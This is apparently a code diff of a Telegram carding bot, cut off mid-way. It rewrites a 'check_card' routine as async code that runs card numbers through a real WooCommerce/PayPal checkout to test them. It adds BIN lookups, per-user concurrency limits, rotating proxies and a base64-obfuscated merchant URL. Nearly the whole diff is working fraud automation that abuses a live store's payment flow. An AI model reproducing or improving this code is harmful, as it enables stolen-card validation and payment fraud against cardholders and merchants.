@@ -36,10 +36,13 @@ ADMIN_ID = 7451622773  # Replace with your admin's Telegram user ID
 REGISTRATION_CHANNEL = "-1002237023678"  # Replace with registration channel ID
 RESULTS_CHANNEL = "-1002158129417"  # Replace with results channel ID
 
-# Track active checks to prevent concurrent checking
+# Enhanced concurrency management
 active_checks = set()
 check_stats = {}
 stats_lock = Lock()
+user_semaphores = {}  # Per-user semaphores to limit concurrent requests
+max_concurrent_per_user = 3  # Maximum concurrent checks per user
+global_semaphore = asyncio.Semaphore(50)  # Global limit for all users
 
 # Initialize SQLite database
 def init_db():
@@ -200,23 +203,38 @@ def generate_random_code(length=32):
 import asyncio
 import httpx
 
-async def fetch_bin(api_url):
+# Fast BIN lookup using bincheck.io API
+async def fetch_bin_fast(bin_number):
+    """Fast BIN lookup using bincheck.io API"""
     try:
-        async with httpx.AsyncClient(timeout=20.0) as client:  # increased timeout from 8 -> 20
+        async with httpx.AsyncClient(timeout=8.0) as client:
+            response = await client.get(f'https://bincheck.io/api/{bin_number}')
+            if response.status_code == 200:
+                data = response.json()
+                if data and data.get('success'):
+                    bin_data = data.get('bin', {})
+                    country_data = bin_data.get('country', {})
+                    return {
+                        'brand': bin_data.get('scheme', 'UNKNOWN').upper(),
+                        'type': bin_data.get('type', 'UNKNOWN').upper(),
+                        'level': bin_data.get('level', 'UNKNOWN').upper(),
+                        'bank': bin_data.get('bank', 'UNKNOWN'),
+                        'country': country_data.get('name', 'UNKNOWN'),
+                        'emoji': country_data.get('emoji', '🏳️')
+                    }
+    except Exception as e:
+        logger.warning(f"bincheck.io API error: {str(e)}")
+    return None
+
+# Fallback BIN lookup for multiple APIs
+async def fetch_bin_fallback(api_url):
+    try:
+        async with httpx.AsyncClient(timeout=10.0) as client:
             response = await client.get(api_url)
         if response.status_code == 200:
             data = response.json()
             if data and isinstance(data, dict):
-                if 'voidex.dev' in api_url and 'brand' in data:
-                    return {
-                        'brand': data.get('brand', 'UNKNOWN'),
-                        'type': data.get('type', 'UNKNOWN'),
-                        'level': data.get('level', 'UNKNOWN'),
-                        'bank': data.get('bank', 'UNKNOWN'),
-                        'country': data.get('country_name', 'UNKNOWN'),
-                        'emoji': data.get('country_flag', '🏳️')
-                    }
-                elif 'binlist.net' in api_url:
+                if 'binlist.net' in api_url:
                     country = data.get('country', {})
                     bank = data.get('bank', {})
                     return {
@@ -237,25 +255,31 @@ async def fetch_bin(api_url):
                         'emoji': data.get('country_flag', '🏳️')
                     }
     except Exception as e:
-        print(f"Error fetching {api_url}: {e}")
+        logger.warning(f"Error fetching {api_url}: {e}")
     return None
 
 async def get_bin_info_async(bin_number):
-    apis = [
-        f'https://api.voidex.dev/api/bin?bin={bin_number}',
+    """Optimized BIN lookup with fast primary API and fallbacks"""
+    # Try fast bincheck.io API first
+    result = await fetch_bin_fast(bin_number)
+    if result:
+        return result
+    
+    # Fallback to other APIs if bincheck.io fails
+    fallback_apis = [
         f'https://lookup.binlist.net/{bin_number}',
         f'https://bins.su/{bin_number}'
     ]
     
-    tasks = [fetch_bin(url) for url in apis]
+    tasks = [fetch_bin_fallback(url) for url in fallback_apis]
     results = await asyncio.gather(*tasks, return_exceptions=True)
 
     # Return first successful response
     for res in results:
-        if res:
+        if res and isinstance(res, dict):
             return res
 
-    # Fallback if all APIs fail
+    # Final fallback if all APIs fail
     return {
         'brand': 'UNKNOWN',
         'type': 'UNKNOWN', 
@@ -265,11 +289,32 @@ async def get_bin_info_async(bin_number):
         'emoji': '🏳️'
     }
 
-# Synchronous wrapper to call from existing script
-def get_bin_info(bin_number):
-    return asyncio.run(get_bin_info_async(bin_number))
+# Optimized synchronous wrapper with caching
+_bin_cache = {}
+_cache_lock = asyncio.Lock()
 
-def check_card(cc_line, proxies=None, user_info=None):
+def get_bin_info(bin_number):
+    """Synchronous wrapper with basic caching for performance"""
+    # Check cache first
+    if bin_number in _bin_cache:
+        return _bin_cache[bin_number]
+    
+    # Get new event loop if none exists
+    try:
+        loop = asyncio.get_event_loop()
+    except RuntimeError:
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+    
+    result = loop.run_until_complete(get_bin_info_async(bin_number))
+    
+    # Cache result for future use (limit cache size)
+    if len(_bin_cache) < 1000:
+        _bin_cache[bin_number] = result
+    
+    return result
+
+async def check_card_async(cc_line, proxies=None, user_info=None):
     start_time = time.time()
     
     try:
@@ -285,291 +330,296 @@ def check_card(cc_line, proxies=None, user_info=None):
         user = generate_user_agent()
         corr = generate_random_code()
         sess = generate_random_code()
-        r = requests.session()
+        # Use aiohttp for async HTTP requests
+        timeout = aiohttp.ClientTimeout(total=30)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
 
         # Encoded site URL to prevent leaking
         encoded_site = base64.b64decode('c3dpdGNodXBjYi5jb20=').decode('utf-8')
         site_url = f'https://{encoded_site}'
 
-        # Get a random proxy for this request
-        proxy = get_random_proxy()
-        proxy_dict = {
-            'http': proxy,
-            'https': proxy
-        } if proxy else None
-        
+            # Get a random proxy for this request
+            proxy = get_random_proxy()
+            
+            # Step 1: Add to cart
+            form_data = aiohttp.FormData()
+            form_data.add_field('quantity', '1')
+            form_data.add_field('add-to-cart', '4451')
+            
+            headers = {
+                'authority': encoded_site,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+                'cache-control': 'max-age=0',
+                'origin': site_url,
+                'referer': f'{site_url}/shop/i-buy/',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': user,
+            }
+            
+            async with session.post(f'{site_url}/shop/i-buy/', headers=headers, data=form_data, proxy=proxy) as response:
+                await response.text()
 
+            # Step 2: Go to checkout
+            headers = {
+                'authority': encoded_site,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+                'referer': f'{site_url}/cart/',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': user,
+            }
+            
+            async with session.get(f'{site_url}/checkout/', headers=headers, proxy=proxy) as response:
+                checkout_text = await response.text()
 
-        # Step 1: Add to cart
-        files = {
-            'quantity': (None, '1'),
-            'add-to-cart': (None, '4451'),
-        }
-        multipart_data = MultipartEncoder(fields=files)
-        headers = {
-            'authority': encoded_site,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'cache-control': 'max-age=0',
-            'content-type': multipart_data.content_type,
-            'origin': site_url,
-            'referer': f'{site_url}/shop/i-buy/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': user,
-        }
-        response = r.post(f'{site_url}/shop/i-buy/', headers=headers, data=multipart_data, proxies=proxy_dict)
+            # Extract tokens
+            sec = (re.search(r'update_order_review_nonce":"(.*?)"', checkout_text).group(1))
+            nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', checkout_text).group(1))
+            check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', checkout_text).group(1))
+            create = (re.search(r'create_order.*?nonce":"(.*?)"', checkout_text).group(1))
 
-        # Step 2: Go to checkout
-        headers = {
-            'authority': encoded_site,
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'referer': f'{site_url}/cart/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': user,
-        }
-        
-        response = r.get(f'{site_url}/checkout/', cookies=r.cookies, headers=headers, proxies=proxy_dict)
+            # Step 3: Update order review
+            headers = {
+                'authority': encoded_site,
+                'accept': '*/*',
+                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': site_url,
+                'referer': f'{site_url}/checkout/',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user,
+            }
+            
+            params = {'wc-ajax': 'update_order_review'}
+            data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
+            
+            async with session.post(site_url, params=params, headers=headers, data=data, proxy=proxy) as response:
+                await response.text()
 
-        # Extract tokens
-        sec = (re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1))
-        nonce = (re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text).group(1))
-        check = (re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1))
-        create = (re.search(r'create_order.*?nonce":"(.*?)"', response.text).group(1))
+            # Step 4: Create PayPal order
+            headers = {
+                'authority': encoded_site,
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'no-cache',
+                'content-type': 'application/json',
+                'origin': site_url,
+                'pragma': 'no-cache',
+                'referer': f'{site_url}/checkout/',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'user-agent': user,
+            }
+            
+            params = {'wc-ajax': 'ppc-create-order'}
+            json_data = {
+                'nonce': create,
+                'payer': None,
+                'bn_code': 'Woo_PPCP',
+                'context': 'checkout',
+                'order_id': '0',
+                'payment_method': 'ppcp-gateway',
+                'funding_source': 'card',
+                'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry={site_url}%2Fshop%2Fi-buy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
+                'createaccount': False,
+                'save_payment_method': False,
+            }
+            
+            async with session.post(site_url, params=params, headers=headers, json=json_data, proxy=proxy) as response:
+                paypal_response = await response.json()
+                
+            id = paypal_response['data']['id']
+            pcp = paypal_response['data']['custom_id']
 
-        # Step 3: Update order review
-        headers = {
-            'authority': encoded_site,
-            'accept': '*/*',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': site_url,
-            'referer': f'{site_url}/checkout/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': user,
-        }
-        params = {'wc-ajax': 'update_order_review'}
-        data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
-        
-        response = r.post(site_url, params=params, headers=headers, data=data, proxies=proxy_dict)
+            # Step 5: Process payment
+            lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+            lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+            lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
+            
+            session_id = f'uid_{lol1}_{lol3}'
+            button_session_id = f'uid_{lol2}_{lol3}'
+            
+            headers = {
+                'authority': 'www.paypal.com',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
+                'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjpmYWxzZSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpdLmF1dGhvcml0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkVersion=5.0.465&storageID=uid_ba45630ca6_mtc6nde6ndk&supportedNativeBrowser=true&supportsPopups=true&vault=false',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'iframe',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': user,
+            }
+            
+            params = {
+                'sessionID': session_id,
+                'buttonSessionID': button_session_id,
+                'locale.x': 'ar_EG',
+                'commit': 'true',
+                'hasShippingCallback': 'false',
+                'env': 'production',
+                'country.x': 'EG',
+                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
+                'disable-card': '',
+                'token': id,
+            }
+            
+            async with session.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, proxy=proxy) as response:
+                await response.text()
 
-        # Step 4: Create PayPal order
-        headers = {
-            'authority': encoded_site,
-            'accept': '*/*',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'no-cache',
-            'content-type': 'application/json',
-            'origin': site_url,
-            'pragma': 'no-cache',
-            'referer': f'{site_url}/checkout/',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': user,
-        }
-        params = {'wc-ajax': 'ppc-create-order'}
-        json_data = {
-            'nonce': create,
-            'payer': None,
-            'bn_code': 'Woo_PPCP',
-            'context': 'checkout',
-            'order_id': '0',
-            'payment_method': 'ppcp-gateway',
-            'funding_source': 'card',
-            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry={site_url}%2Fshop%2Fi-buy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
-            'createaccount': False,
-            'save_payment_method': False,
-        }
-        
-        response = r.post(site_url, params=params, cookies=r.cookies, headers=headers, json=json_data, proxies=proxy_dict)
-
-        id = response.json()['data']['id']
-        pcp = response.json()['data']['custom_id']
-
-        # Step 5: Process payment
-        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
-        random_chars_button = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
-
-        session_id = f'uid_{lol1}_{lol3}'
-        button_session_id = f'uid_{lol2}_{lol3}'
-
-        headers = {
-            'authority': 'www.paypal.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en;q=0.7,en-US;q=0.6',
-            'referer': 'https://www.paypal.com/smart/buttons?style.label=paypal&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_378e07784c_mtc6nde6ndk&buttonSize=large&customerId=&clientID=AY7TjJuH5RtvCuEf2ZgEVKs3quu69UggsCg29lkrb3kvsdGcX2ljKidYXXHPParmnymd9JacfRh0hzEp&clientMetadataID=uid_b5c925a7b4_mtc6nde6ndk&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=venmo&enableFunding.1=paylater&env=production&experiment.enableVenmo=true&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjpmYWxzZSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpdLmF1dGhvcml0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkVersion=5.0.465&storageID=uid_ba45630ca6_mtc6nde6ndk&supportedNativeBrowser=true&supportsPopups=true&vault=false',
-            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
